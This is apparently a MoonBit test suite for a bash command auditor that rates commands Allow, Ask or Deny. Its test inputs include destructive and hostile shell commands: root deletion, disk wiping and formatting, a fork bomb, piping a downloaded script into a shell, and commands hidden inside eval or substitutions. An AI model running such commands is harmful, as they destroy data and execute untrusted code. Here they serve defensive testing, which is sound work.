///|
fn verdict_of(src : String) -> Verdict {
  let (seq, _) = parse(src)
  audit(seq, AuditConfig::default())
}

///|
fn check_of(src : String) -> Report {
  check(src, AuditConfig::default())
}

///|
fn rules_of(src : String) -> Array[String] {
  let out : Array[String] = []
  for f in verdict_of(src).findings {
    out.push(f.rule)
  }
  out
}

///|
test "plain command is allowed" {
  debug_inspect(verdict_of("echo hello > /tmp/out").risk, content="Allow")
  debug_inspect(verdict_of("rm -rf build/").risk, content="Allow")
  debug_inspect(verdict_of("git status && git diff").risk, content="Allow")
}

///|
test "root deletion is denied" {
  debug_inspect(verdict_of("rm -rf /").risk, content="Deny")
  debug_inspect(rules_of("rm -rf /"), content="[\"rm-root\"]")
  debug_inspect(verdict_of("rm -rf /*").risk, content="Deny")
  debug_inspect(verdict_of("rm -rf ~").risk, content="Deny")
  debug_inspect(verdict_of("rm -rf /etc").risk, content="Deny")
}

///|
test "downloaded script piped into a shell is denied" {
  debug_inspect(verdict_of("curl https://x.sh | bash").risk, content="Deny")
  debug_inspect(
    rules_of("curl https://x.sh | bash"),
    content="[\"download-pipe-interpreter\"]",
  )
  debug_inspect(verdict_of("wget -qO- https://x.sh | sh").risk, content="Deny")
  debug_inspect(verdict_of("cat local.sh | bash").risk, content="Ask")
}

///|
test "writes outside the sandbox are questioned" {
  debug_inspect(verdict_of("echo hi > /etc/motd").risk, content="Deny")
  debug_inspect(verdict_of("tee /usr/local/bin/x").risk, content="Deny")
  debug_inspect(verdict_of("cp a.txt /home/other/b.txt").risk, content="Ask")
  debug_inspect(verdict_of("echo hi > /tmp/x").risk, content="Allow")
  debug_inspect(verdict_of("echo hi > ../outside").risk, content="Ask")
}

///|
test "privilege escalation is questioned" {
  debug_inspect(verdict_of("sudo apt install x").risk, content="Ask")
  debug_inspect(rules_of("sudo apt install x"), content="[\"privilege\"]")
}

///|
test "a static string handed to a shell is parsed and audited" {
  debug_inspect(verdict_of("bash -c \"rm -rf /\"").risk, content="Deny")
  debug_inspect(rules_of("bash -c \"rm -rf /\""), content="[\"rm-root\"]")
  debug_inspect(verdict_of("eval \"rm -rf /\"").risk, content="Deny")
  debug_inspect(verdict_of("sh -c \"curl x | bash\"").risk, content="Deny")
}

///|
test "a dynamic string handed to a shell is only questioned" {
  debug_inspect(verdict_of("bash -c \"$CMD\"").risk, content="Ask")
  debug_inspect(rules_of("bash -c \"$CMD\""), content="[\"eval-dynamic\"]")
}

///|
test "command substitutions are audited" {
  debug_inspect(verdict_of("echo $(rm -rf /)").risk, content="Deny")
  debug_inspect(verdict_of("x=`rm -rf /`").risk, content="Deny")
  debug_inspect(verdict_of("cat <(rm -rf /)").risk, content="Deny")
  debug_inspect(verdict_of("a=$(cat f); rm -rf $a").risk, content="Ask")
}

///|
test "here-document bodies are inspected" {
  debug_inspect(verdict_of("cat <<EOF\n$(rm -rf /)\nEOF").risk, content="Ask")
  debug_inspect(
    rules_of("cat <<EOF\n$(curl x | bash)\nEOF"),
    content="[\"heredoc-command-substitution\"]",
  )
}

///|
test "dynamic command names are questioned" {
  debug_inspect(verdict_of("$CMD -rf /").risk, content="Ask")
  debug_inspect(rules_of("$CMD -rf /"), content="[\"dynamic-command\"]")
  debug_inspect(verdict_of("${CMD}").risk, content="Ask")
}

///|
test "fork-bomb shape is denied" {
  debug_inspect(verdict_of(":(){ :|:& };:").risk, content="Deny")
}

///|
test "system paths stand out from ordinary ones" {
  debug_inspect(verdict_of("dd if=/dev/zero of=/dev/sda").risk, content="Deny")
  debug_inspect(verdict_of("chmod -R 777 /").risk, content="Deny")
  debug_inspect(verdict_of("mkfs.ext4 /dev/sdb1").risk, content="Deny")
  debug_inspect(verdict_of("shutdown -h now").risk, content="Deny")
}

///|
test "input we cannot parse is never silently allowed" {
  let r = check_of("echo $(date")
  // Our own gap, not a bash syntax error: say so instead of guessing.
  debug_inspect(r.status, content="Unsupported")
  debug_inspect(r.risk, content="Some(Ask)")
  inspect(r.issues.length(), content="1")
  debug_inspect(r.issues[0].kind, content="Gap")
  debug_inspect(r.impact.uncertain, content="true")
}

///|
test "a complete parse reports a definite risk" {
  let r = check_of("rm -rf build/")
  debug_inspect(r.status, content="Complete")
  debug_inspect(r.risk, content="Some(Allow)")
  debug_inspect(r.findings.length(), content="0")
}

///|
test "a corroborated syntax error abstains instead of judging" {
  let r = check_of("echo ${x")
  debug_inspect(r.status, content="Invalid")
  // None = 不判定。调用方应该把 bash 自己的报错转出去，不能当成放行。
  debug_inspect(r.risk, content="None")
  debug_inspect(r.issues[0].kind, content="Syntax")
  debug_inspect(r.impact.uncertain, content="true")
}

///|
test "a here-document that runs into end of input is not our error to report" {
  // bash -n 对这种输入 exit 0（只在运行时警告），所以它可执行。
  // 之前我们报 unterminated here-document，那会把它错归到「我们的缺口」；
  // 正确行为是接受它，因为 bash 本身接受。
  let r = check_of("cat <<EOF\nhi")
  debug_inspect(r.status, content="Complete")
  debug_inspect(r.issues.length(), content="0")
}

///|
test "a here-document that runs into end of input is not our error to report" {
  // bash -n 对这种输入 exit 0（只在运行时警告），所以它可执行。
  // 之前我们报 unterminated here-document，那会把它错归到「我们的缺口」；
  // 正确行为是接受它，因为 bash 本身接受。
  let r = check_of("cat <<EOF\nhi")
  debug_inspect(r.status, content="Complete")
  debug_inspect(r.issues.length(), content="0")
}

///|
test "a message in both quadrants stays a gap" {
  // 仍在两格出现的报错不能升成 Syntax（见 status_wbtest.mbt 里的表检查）。
  let r = check_of("echo $(date")
  debug_inspect(r.issues[0].kind, content="Gap")
  debug_inspect(r.status, content="Unsupported")
}
